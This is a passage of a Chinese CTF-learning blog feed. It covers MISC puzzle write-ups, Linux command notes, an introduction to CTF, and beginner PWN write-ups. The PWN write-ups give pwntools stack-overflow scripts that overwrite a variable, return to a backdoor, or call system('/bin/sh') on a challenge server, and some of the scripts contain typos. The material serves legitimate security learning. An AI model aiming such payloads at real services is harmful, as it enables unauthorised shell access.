alt="image-20220127194053640"></p><p>010改改编码多看几次，最后发现是EBCDIC</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127194451453.png" alt="image-20220127194451453"></p><p>解压出如图图片，《跳舞的小人》</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127194736976.png" alt="image-20220127194736976"></p><p>让我们打开《福尔摩斯》，开始解密！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127195058893.png" alt="image-20220127195058893"></p><p>最后解出来为</p><blockquote><p>flag{iloveholmesandwllm}</p></blockquote><hr><h2 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h2><p>打开之后是ook编码，直接解码即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127195622220.png" alt="image-20220127195622220"></p><p>网址：</p><blockquote><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p></blockquote><hr><h2 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h2><p>打开文件，发现rar文件头</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127200537552.png" alt="image-20220127200537552"></p><p>直接改后缀打开报错，在经过查询之后（太菜了对博起😭），错因如下（大佬写的！）</p><blockquote><p>没有完全理解编码，txt上显示的数字与010中显示的十六进制是不一样的。010中的编码是将txt中的内容用Ascll码编码后的结果，如图：txt中显示的52617221到了010中编码为35 32 36 31 37 32 32 31。而文件头是指转换为16进制Ascll码后的数值。所以，本题应该将txt写入rar文件。</p></blockquote><p>写入脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;hei.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="comment">#十六进制数据文件</span></span><br><span class="line">lines = a.read()</span><br><span class="line">res = [lines[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(lines),<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hei.rar&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">s = struct.pack(<span class="string">&#x27;B&#x27;</span>,<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line">f.write(s)</span><br></pre></td></tr></table></figure><p>爆破出来的压缩包密码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127201444016.png" alt="image-20220127201444016"></p><p>打开后是一个无法直接打开的png图片，010打开后，直接搜索没有搜到有效信息，仔细观察16进制，头不对尾，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127201954741.png" alt="image-20220127201954741">我们将文件头改为jpg的之后，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127202007347.png" alt="image-20220127202007347"></p><p>就可以成功打开了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127202035558.png" alt="image-20220127202035558"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://0410wzn.top/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN新手区WP（长期更新）</title>
    <link href="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2021-11-17T11:02:54.000Z</published>
    <updated>2021-12-09T03:39:11.852Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界PWN新手区WP（长期更新）"><a href="#攻防世界PWN新手区WP（长期更新）" class="headerlink" title="攻防世界PWN新手区WP（长期更新）"></a>攻防世界PWN新手区WP（长期更新）</h1><blockquote><p>题目地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0</a></p></blockquote><h2 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h2><p>  获取靶场,nc登上查看即可，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117192610443.png" alt="image-20211117192610443" style="zoom:33%;"><h2 id="二、Hello-pwn"><a href="#二、Hello-pwn" class="headerlink" title="二、Hello pwn!"></a>二、Hello pwn!</h2><p>  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117193524850.png" alt="image-20211117193524850" style="zoom: 75%;"><p>  嗯，只开了NX，好耶！</p><p>  接下来用64位的ida打开分析逻辑，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117194019299.png" alt="image-20211117194019299" style="zoom:50%;"><p>  看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。</p><p>  明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;地址&#x27;</span>， 端口)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x60106C</span> - <span class="number">0x60106C</span>) + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;bof\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行，皆大欢喜。</p><p>  <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117195744632.png" alt="image-20211117195744632"></p><h2 id="三、level0"><a href="#三、level0" class="headerlink" title="三、level0"></a>三、level0</h2><p>  先用checksec看一下文件位数和保护措施，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/level0_01.png" alt="level0_01" style="zoom:75%;"><p>  依旧是只有NX开了，题目应该比较简单</p><p>  将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119104858061.png" alt="image-20211119104858061" style="zoom: 90%;"> <p>  发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119105037317.png" alt="image-20211119105037317" style="zoom:75%;"><p>  发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context,arch = <span class="string">&quot;amd64&quot;</span>// 切换环境</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;地址&#x27;</span>, 端口)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span>// 函数在栈中的位置</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(callsystem)// 使程序最终运行后门函数</span><br><span class="line"></span><br><span class="line">io = sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119110053521.png" alt="image-20211119110053521" style="zoom:50%;"><h2 id="四、level2-level1去哪了"><a href="#四、level2-level1去哪了" class="headerlink" title="四、level2 (level1去哪了???)"></a>四、level2 (level1去哪了???)</h2><p>在做完看不见的level1之后，我们来到了level2🐶</p><p>首先，查看一下文件的信息与保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208135638738.png" alt="image-20211208135638738"></p><p>32位可执行程序，只开启了NX，因此不能直接使用shellcode，但是可以进行栈溢出，构建ROP链。</p><p>拖进ida查看一下</p><table frame="void">    <!--使用table标签，且frame=void消除外边框-->    <tr>           <!--<tr>一行的内容<\tr>，<td>一个格子的内容<\td>-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140417769.png" alt="第一张图片显示不出时显示的文字" height="填数字作为高度"></center></td>    <!--<center>标签将图片居中-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140641524.png" alt="第二张图片显示不出时显示的文字" height="高度一致会好看"></center></td>    </tr></table><p>很好，有system函数和/bin/sh字符串，应该不需要自己构建了，溢出覆盖即可，接下来查看函数</p><p>main函数如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140205803.png" alt="image-20211208140205803"></p><p>接着查看vulnerable_function函数：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140847287.png" alt="image-20211208140847287"></p><p>这里存在明显可以发生栈溢出的状况，到这一步，我们的思路基本上确定了，通过溢出覆盖构造一个system(“/bin/sh”)的伪栈帧，vulnerable_function()执行结束后返回到我们构造的伪栈帧去执行system(“bin/sh”)，这样就可以获取shell。</p><p>上linux！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208141809821.png" alt="image-20211208141809821"></p><p>首先查找system函数和/bin/sh/字节的地址（这里刚学习使用elf直接查找，用ida也可以）</p><p>接下来就是编写脚本了，具体思路就是：</p><p>将返回地址覆盖为system函数，再将system函数引向/bin/sh字节，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;地址&#x27;</span>, 端口)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中的p32(0) ，是为了栈平衡，覆盖函数的返回地址，system的参数实际上是两字节后的/bin/sh。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209111403902.png" alt="image-20211209111403902"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="人生苦短，我学Pwn" scheme="https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux学习札记</title>
    <link href="https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    <id>https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/</id>
    <published>2021-10-20T15:35:51.000Z</published>
    <updated>2021-10-23T16:17:49.911Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>  本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。</p><h4 id="1、pwd"><a href="#1、pwd" class="headerlink" title="1、pwd"></a>1、pwd</h4><p>  pwd命令常用于得知操作者目前所在的目录名称。</p><h4 id="2、ls"><a href="#2、ls" class="headerlink" title="2、ls"></a>2、ls</h4><p>  ls命令用于显示目前操作者所在目录之下的内容</p><blockquote><ul><li>-a 显示所有文件及目录 (<font size="3" color="red"><strong>.</strong> 开头的隐藏文件也会列出</font>)</li><li>-l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</li><li>-r 将文件以相反次序显示(原定依英文字母次序)</li><li>-t 将文件依建立时间之先后次序列出</li><li>-A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录)</li><li>-F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“</li><li>-R 若目录下有文件，则以下之文件亦皆依序列出</li></ul></blockquote><h4 id="3、-cat"><a href="#3、-cat" class="headerlink" title="3、 cat"></a>3、 cat</h4><p>  cat命令用于连接文件并打印到标准输出设备上</p><blockquote><ul><li><p>-n 或 –number**：由 1 开始对所有输出的行数编号。</p></li><li><p>-b 或 –number-nonblank**：和 -n 相似，只不过对于空白行不编号</p></li><li><p>-s 或 –squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行</p></li><li><p>-v 或 –show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外</p></li><li><p>-E 或 –show-ends : 在每行结束处显示 $</p></li><li><p>-T 或 –show-tabs: 将 TAB 字符显示为 ^I</p></li><li><p>-A, –show-all：等价于 -vET</p></li><li><p>-e：**等价于”-vE”选项</p></li><li><p>-t：**等价于”-vT”选项</p></li></ul></blockquote><p>例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/07.png" style="zoom:67%;"></p><h4 id="4、-file"><a href="#4、-file" class="headerlink" title="4、 file"></a>4、 file</h4><p>  file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的<font size="3" color="red">文件头</font>来判断的，因此linux可以准确地判断文件为何种类型。</p><blockquote><ul><li>-b 　列出辨识结果时，不显示文件名称</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形</li><li>-f      &lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称</li><li>-L 　直接显示符号连接所指向的文件的类别</li><li>-m    &lt;魔法数字文件&gt; 　指定魔法数字文件</li><li>-v 　显示版本信息</li><li>-z 　尝试去解读压缩文件的内容</li><li>[文件或目录…]     要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件</li></ul></blockquote><p>  例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/12.png" style="zoom:67%;"></p><h4 id="5、-find"><a href="#5、-find" class="headerlink" title="5、 find"></a>5、 find</h4><p>  find一般用来查找指定目录下的文件，<font size="3" color="red">如果未加参数，则会将查到的子目录与文件全部显示</font>。</p><blockquote><p>由于参数过多，下面只列出较为常用的部分：</p><ul><li><p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p></li><li><p>-amin n : 在过去 n 分钟内被读取过</p></li><li><p>-anewer file : 比文件 file 更晚被读取过的文件</p></li><li><p>-atime n : 在过去n天内被读取过的文件</p></li><li><p>-cmin n : 在过去 n 分钟内被修改过</p></li><li><p>-cnewer file :比文件 file 更新的文件</p></li><li><p>-ctime n : 在过去n天内被修改过的文件</p></li><li><p>-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</p></li><li><p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p></li><li><p>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</p></li><li><p>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</p></li><li><p>-type c : 文件类型是 c 的文件。</p></li><li><p>d: 目录</p></li><li><p>c: 字型装置文件</p></li><li><p>b: 区块装置文件</p></li><li><p>p: 具名贮列</p></li><li><p>f: 一般文件</p></li><li><p>l: 符号连结</p></li><li><p>s: socket</p></li><li><p>-pid n : process id 是 n 的文件</p></li></ul></blockquote><p>  例：（这里与下一命令size一起列出）<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/16.png" style="zoom: 67%;"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Linux命令入门" scheme="https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界MISC新手题部分WP(更新ing)</title>
    <link href="https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/"/>
    <id>https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/</id>
    <published>2021-10-10T00:34:06.000Z</published>
    <updated>2021-10-29T08:51:16.920Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界Misc新手题WP"><a href="#攻防世界Misc新手题WP" class="headerlink" title="攻防世界Misc新手题WP"></a>攻防世界Misc新手题WP</h1><blockquote><p>地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0</a></p></blockquote><h2 id="一、PDF"><a href="#一、PDF" class="headerlink" title="一、PDF"></a>一、PDF</h2><blockquote><p>菜猫给了菜狗一张图，说图下面什么都没有</p></blockquote><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/01.jpg" alt="01" style="zoom: 25%;"><p>  因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。</p><p>  首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。</p><p>  通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/02.jpg" alt="02.jpg" style="zoom: 50%;"><p>   当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/03.jpg" alt="03.jpg" style="zoom:25%;"><p>  复制粘贴结束。</p><h2 id="二、give-you-flag"><a href="#二、give-you-flag" class="headerlink" title="二、give_you_flag"></a>二、give_you_flag</h2><blockquote><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</p></blockquote><p>  下载附件后，看到如下动图。</p><p>​                                                            <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/4b0799f9a4d649f09a882b6b1130bb70%20(1).gif">  </p><p>  题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由  此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/image-20211012164312725.png"></p><p>  我们使用分帧工具将图片提取出来，得到带有二维码的图片</p><p>​                                                                   <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/IMG00049.bmp"></p><p>  很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入门" scheme="https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF简介</title>
    <link href="https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/"/>
    <id>https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/</id>
    <published>2021-10-09T13:57:31.000Z</published>
    <updated>2021-10-29T08:50:20.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CTF简介"><a href="#一、CTF简介" class="headerlink" title="一、CTF简介"></a>一、CTF简介</h1><p>  Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:<a href="https://baike.baidu.com/item/CTF/9548546?fr=aladdin">CTF</a>词条。</p><p><a href="E:\photo\CTF">CTF</a></p><h1 id="二、CTF的题目类型"><a href="#二、CTF的题目类型" class="headerlink" title="二、CTF的题目类型"></a>二、CTF的题目类型</h1><p>​    CTF的题目类型大致包括以下五种： <a href="#Web">Web</a>，<a href="#Pwn">Pwn</a>，<a href="#Misc">Misc</a>， <a href="#Reverse">Reverse</a>，<a href="#Crypto">Crypto</a></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>​    Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件.</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>​    Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><pre><code>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</code></pre><p>   常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>​    Reverse题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>​    Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h1 id="三、CTF的比赛形式"><a href="#三、CTF的比赛形式" class="headerlink" title="三、CTF的比赛形式"></a>三、CTF的比赛形式</h1><p>  CTF的比赛形式主要包括以下几种：<a href="#%E7%90%86%E8%AE%BA%E7%B1%BB">理论类</a>，<a href="#Jeopardy-%E8%A7%A3%E9%A2%98">Jeopardy-解题</a>)，<a href="#AwD-%E6%94%BB%E9%98%B2">AwD-攻防</a>，<a href="#RHG-%E8%87%AA%E5%8A%A8%E5%8C%96">RHG-自动化</a>，<a href="#RW-%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C">RW-真实世界</a>，<a href="#KoH-%E6%8A%A2%E5%8D%A0%E5%B1%B1%E5%A4%B4">KoH-抢占山头</a>，<a href="#Mix-%E6%B7%B7%E5%90%88">MIX-混合</a></p><h2 id="理论类"><a href="#理论类" class="headerlink" title="理论类"></a>理论类</h2><p>​    理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h2><p>​    参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防"><a href="#AwD-攻防" class="headerlink" title="AwD-攻防"></a>AwD-攻防</h2><p>​    <strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化"><a href="#RHG-自动化" class="headerlink" title="RHG-自动化"></a>RHG-自动化</h2><p>​    <strong>R</strong>obo <strong>H</strong>acking 